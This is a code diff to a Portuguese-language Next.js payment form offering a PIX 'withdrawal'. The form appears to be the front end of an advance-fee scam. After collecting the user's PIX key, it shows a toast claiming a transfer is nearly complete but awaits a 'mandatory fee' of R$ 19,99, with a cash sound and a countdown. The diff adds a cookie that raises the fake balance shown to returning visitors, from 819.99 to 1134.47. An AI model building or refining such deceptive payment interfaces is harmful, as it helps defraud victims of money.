@@ -17,10 +17,10 @@ import { InputMask } from '@react-input/mask';
 import { CHECKOUT_URL } from '@/functions/urls'
 import type { StaticImport } from 'next/dist/shared/lib/get-img-props'
 import { getData } from '@/functions/get-cookie'
-import { setCookie } from 'cookies-next'
+import { hasCookie, setCookie } from 'cookies-next'
 import useSound from 'use-sound'
 import Sound from '@/assets/cash.mp3'
-import { Loader } from 'lucide-react'
+import { Loader, TriangleAlert } from 'lucide-react'
 import { useRouter } from 'next/navigation'
 
 export function FormPayment() {
@@ -98,6 +98,8 @@ export function FormPayment() {
       maxAge: 60 * 60 * 24 * 30,
     });
 
+    const value = hasCookie('user_checkout') ? 1134.47 : 819.99
+
 
     let localImage: StaticImport | string = "";
 
@@ -138,7 +140,9 @@ export function FormPayment() {
 
     toast(
       <div className='flex items-center gap-3'>
-        <Image src={localImage} alt="bank" className='w-[40px] h-auto object-cover' width={0} height={0} priority />
+        <div className='rounded-lg bg-white border border-black'>
+          <TriangleAlert className='size-11 fill-yellow-400' />
+        </div>
         <div className='space-y-0'>
           <span className='font-semibold text-sm text-black'>Transferência PIX pendente!</span>
           <p className='text-black tracking-wide leading-4'>Transferência de <span className='font-bold'>
@@ -147,7 +151,7 @@ export function FormPayment() {
               new Intl.NumberFormat('pt-BR', {
                 style: 'currency',
                 currency: 'BRL',
-              }).format(Number(819.99))
+              }).format(Number(value))
             }
 
           </span> quase concluida, aguardando pagamento da taxa obrigatoria de <strong>R$ 19,99</strong>.</p>
@@ -160,6 +164,10 @@ export function FormPayment() {
 
     play()
 
+    setCookie('user_checkout', true, {
+      path: '/',
+      maxAge: 60 * 60 * 24 * 30,
+    })
 
 
     const countdown = setInterval(() => {
@@ -268,25 +276,25 @@ export function FormPayment() {
 
 
         {btn === "tel" && (
-          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="(__) _____-____" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
+          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="(__) _____-____" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
         )}
 
 
         {btn === "cpf" && (
-          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="___.___.___-__" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
+          <InputMask type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} mask="___.___.___-__" replacement={{ _: /\d/ }} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full h-11' placeholder='Digite sua chave PIX aqui....' />
         )}
 
         {btn === "email" && (
-          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
+          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
         )}
 
         {btn === "chave" && (
-          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#005952] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
+          <input type={typeInput} value={pixKey} onChange={(e) => setPixKey(e.target.value)} className='p-2 rounded-lg ring-1 ring-[#1c7069] focus:ring-2 outline-none border-0 w-full  h-11' placeholder='Digite sua chave PIX aqui....' />
         )}
 
 
 
-        <button onClick={handleSaque} className='w-full bg-[#005952] h-12 flex items-center justify-center text-white font-semibold  rounded-3xl'>
+        <button onClick={handleSaque} className='w-full bg-[#1c7069] h-12 flex items-center justify-center text-white font-semibold  rounded-3xl'>
           {loading ? (<Loader className="size-6 animate-spin text-white" />) : (
             <span>Realizar saque agora</span>
           )}
